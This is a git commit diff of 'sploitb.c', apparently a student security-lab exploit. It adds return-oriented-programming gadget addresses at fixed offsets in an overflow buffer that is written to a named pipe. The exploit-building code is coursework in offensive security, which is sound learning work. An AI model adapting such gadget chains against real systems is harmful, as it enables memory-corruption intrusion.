402943a238b6fc2b3d7378fdfb1013951a9ae015
ishanphadke <44324805+ishanphadke@users.noreply.github.com>
2020-10-25 15:08:20 -0500

    sploitb, test socket syscall

--- lab4/sploitb.c
+++ lab4/sploitb.c
@@ -10,7 +10,8 @@ int main(void)
   char bufr[200];
 
   char pop_edx[] = "\x1b\xdc\xb9\xbb";
-
+  char xor_eax[] = "\xc2\xb3\xa9\xbb"; 
+  char add_dl_al[] = "\x07\x46\xbb\xbb";
   char exec_arg[] = "\x8a\x01\x01\x01";
 
   int i;
@@ -19,7 +20,9 @@ int main(void)
     memcpy(bufr + i, "\x01",1);
 
   strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
-
+  strcpy(bufr + 135, exec_arg);
+  strcpy(bufr + 139, xor_eax);
+  strcpy(bufr + 143, add_dl_al);
   writecmd(PIPEPATH, bufr);
   
   return 0;
